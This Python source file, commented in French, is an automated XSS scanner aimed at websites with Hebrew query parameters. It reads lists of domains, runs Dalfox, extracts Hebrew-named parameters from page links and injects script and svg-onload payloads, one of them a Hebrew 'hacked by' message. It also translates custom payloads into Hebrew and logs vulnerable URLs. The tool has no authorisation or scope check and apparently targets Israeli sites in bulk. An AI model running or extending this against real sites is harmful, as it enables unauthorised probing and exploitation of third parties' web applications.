import os
import subprocess
import questionary
import httpx
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode
from translate import Translator  # Utilisé pour traduire les payloads

# Couleurs
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# Définir le traducteur pour l'hébreu
translator = Translator(to_lang="he")

# Fonction de traduction en hébreu
def translate_to_hebrew(payloads):
    translated_payloads = []
    for payload in payloads:
        try:
            translated_payloads.append(translator.translate(payload))
        except Exception as e:
            print(f"{RED}Erreur de traduction : {e}{RESET}")
    return translated_payloads

# Charger les payloads depuis un fichier texte
def load_payloads_from_file():
    file_path = questionary.text("Entrez le chemin du fichier de payloads :").ask()
    if not os.path.exists(file_path):
        print(f"{RED}[-] Erreur : fichier non trouvé !{RESET}")
        return []
    
    with open(file_path, "r", encoding="utf-8") as f:
        payloads = [line.strip() for line in f.readlines()]
    
    return payloads

# Scanner XSS avec Dalfox
def scan_xss_dalfox(target):
    print(f"{GREEN}[+] Scanning XSS with Dalfox: {target}{RESET}")
    result = subprocess.run(["dalfox", "url", target], capture_output=True, text=True)
    return result.stdout

# Vérifier si le domaine est actif
def is_domain_active(domain):
    try:
        response = httpx.get(domain, timeout=5)
        return response.status_code < 400
    except:
        return False

# Extraire les paramètres en hébreu des URLs
def extract_hebrew_params(url):
    try:
        response = httpx.get(url, timeout=5)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            
            params = set()
            
            # Récupérer les paramètres des liens
            for link in soup.find_all("a", href=True):
                parsed_url = urlparse(link["href"])
                query_params = parse_qs(parsed_url.query)
                for param in query_params:
                    if any("\u0590" <= c <= "\u05FF" for c in param):  # Vérifie si l'URL contient de l'hébreu
                        params.add(param)
            
            return list(params)
        return []
    except:
        return []

# Injecter les payloads XSS (normaux + traduits)
def test_xss_with_hebrew_params(url, payloads):
    params = extract_hebrew_params(url)
    if not params:
        print(f"{RED}[-] Aucun paramètre en hébreu détecté sur {url}{RESET}")
        return None

    print(f"{GREEN}[+] Paramètres détectés : {params}{RESET}")

    for param in params:
        for payload in payloads:
            injected_params = {param: payload}
            injected_url = f"{url}?{urlencode(injected_params)}"
            print(f"{GREEN}[+] Test XSS : {injected_url}{RESET}")
            
            response = httpx.get(injected_url, timeout=5)
            if payload in response.text:
                print(f"{RED}[!] XSS trouvé sur {url} avec paramètre {param}{RESET}")
                return injected_url  # Renvoie la première URL vulnérable

    return None

# Fonction principale
def main():
    choix = questionary.select(
        "Comment souhaitez-vous scanner les sites ?",
        choices=["📄 Depuis un fichier .txt", "🌐 Entrer un domaine manuellement"]
    ).ask()

    if choix == "📄 Depuis un fichier .txt":
        fichier = questionary.text("Entrez le chemin du fichier contenant les domaines :").ask()
        if not os.path.exists(fichier):
            print(f"{RED}[-] Erreur : fichier non trouvé !{RESET}")
            return

        with open(fichier, "r") as f:
            domaines = [line.strip() for line in f.readlines()]
    
    else:
        domaine = questionary.text("Entrez le domaine à scanner (ex: https://exemple.co.il)").ask()
        domaines = [domaine]

    print(f"{GREEN}[+] Vérification des domaines actifs...{RESET}")
    domaines = [d for d in domaines if is_domain_active(d)]
    if not domaines:
        print(f"{RED}[-] Aucun domaine actif trouvé.{RESET}")
        return

    # Charger les payloads standards
    default_payloads = [
        "<script>alert('XSS')</script>",
        "כ<script>alert('נפרץ על ידי טראחקנון')</script>",  # Hébreu : "Hacking"
        "'><svg/onload=alert('פריצה')>",
    ]

    # Demander si l'utilisateur veut ajouter ses propres payloads
    use_custom_payloads = questionary.confirm("Voulez-vous ajouter des payloads personnalisés ?").ask()
    if use_custom_payloads:
        custom_payloads = load_payloads_from_file()
        translated_payloads = translate_to_hebrew(custom_payloads)
        all_payloads = default_payloads + translated_payloads
    else:
        all_payloads = default_payloads

    print(f"{GREEN}[+] Début du scan XSS...{RESET}")
    with open("resultats_xss_hebrew.txt", "w") as result_file:
        for site in domaines:
            print(f"{GREEN}[+] Scanning : {site}{RESET}")
            
            dalfox_result = scan_xss_dalfox(site)
            vulnerable_url = test_xss_with_hebrew_params(site, all_payloads)
            
            result_file.write(f"--- Résultats pour {site} ---\n")
            result_file.write(dalfox_result + "\n")
            if vulnerable_url:
                result_file.write(f"⚠️ XSS détecté sur : {vulnerable_url}\n")

    print(f"{GREEN}[+] Scan terminé. Résultats sauvegardés dans 'resultats_xss_hebrew.txt'.{RESET}")

if __name__ == "__main__":
    main()
